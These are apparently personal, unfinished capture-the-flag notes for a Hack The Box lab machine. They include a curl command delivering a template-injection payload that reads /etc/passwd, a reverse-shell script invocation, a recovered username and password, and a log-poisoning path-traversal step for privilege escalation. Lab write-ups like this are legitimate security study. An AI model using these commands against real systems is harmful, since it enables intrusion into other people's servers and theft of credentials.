```
10.10.11.170
```
```
woodenk
```
To do:
1. why cant i get reverse hell directly from SSTI?

```bash
CMD='cat /etc/passwd'; PAYLOAD=`python3 ssti-payload.py $CMD`; curl -s -X POST -F "name=$PAYLOAD" "http://$IP:8080/search" | html2text
```
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md

Don't generate an ssh key and enter using ssh. We need to get a shell from web to enter as group 'logs'.

![](../Assets/images/Pasted%20image%2020220823181540.png)

```
bash revshell.sh
```
```
woodenk:RedPandazRule
```
Scripts:
```
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java -> creats redpanda.log
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/PandaSearchApplication.java
```

```
cat /opt/panda_search/redpanda.log
```
```
cd /opt/panda_search/src/main/resources/static
```
```
cd /opt/credit-score/LogParser/final/src/main/java/com/logparser/
```

## Privilege Escalation
1. poison log to redirect image location.
```
echo "200||a||a||/../../../../../../tmp/image.jpg" > /opt/panda_search/redpanda.log
```
2. replace image metadata with custom author.
```
../tmp/secret
```
3. 